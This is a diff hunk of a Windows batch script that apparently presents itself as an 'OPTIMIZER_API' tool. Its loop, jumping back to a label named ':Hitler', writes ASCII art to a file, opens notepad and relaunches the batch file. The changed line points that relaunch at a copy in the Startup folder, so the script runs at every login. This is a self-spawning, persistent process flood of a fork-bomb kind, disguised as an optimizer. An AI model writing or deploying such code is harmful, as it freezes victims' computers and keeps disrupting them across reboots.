@@ -27,5 +27,5 @@ REM Loops
 	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> %FILENAME%
 	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> %FILENAME%
   	start "" notepad.exe
-  	start "" OPTIMIZER_API.bat
+  	start "" C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\OPTIMIZER_API.bat
   	goto :Hitler
